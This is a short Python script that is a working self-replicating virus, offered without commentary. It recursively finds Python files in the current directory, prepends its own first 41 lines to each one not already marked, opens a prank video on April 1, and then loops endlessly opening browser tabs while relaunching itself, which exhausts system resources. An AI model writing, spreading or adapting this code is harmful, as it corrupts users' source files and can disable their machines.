import os, datetime, inspect, webbrowser, pathlib, os
DATA_TO_INSERT = "#spaghetti is dope as hell"
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for filename in filelist:
        if os.path.isdir(path+"/"+filename):
            filestoinfect.extend(search(path+"/"+filename))
        elif filename[-3:] == ".py":
            infected = False
            for line in open(path+"/"+filename):
                if DATA_TO_INSERT in line:
                    infected = True
                    break
            if infected == False:
                 filestoinfect.append(path+"/"+filename)
    return filestoinfect
def infect(filestoinfect):
    target_file = inspect.currentframe().f_code.co_filename
    virus = open(os.path.abspath(target_file))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <41:
            virusstring += line
    virus.close
    for fname in filestoinfect:
         f = open(fname)
         temp = f.read()
         f.close()
         f = open(fname,"w")
         f.write(virusstring + temp)
         f.close()
def explode():
      if datetime.datetime.now().month == 4 and datetime.datetime.now().day == 1:
             print ("SHOTGUN")
             webbrowser.open('https://www.youtube.com/watch?v=dQw4w9WgXcQ')
def getfucked():

    eatFood = pathlib.Path().absolute()
    while True:
        webbrowser.open("https://www.youtube.com/watch?v=1yOWszgwejs")
        os.system(f'python3 {__file__}')

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
explode()
getfucked()
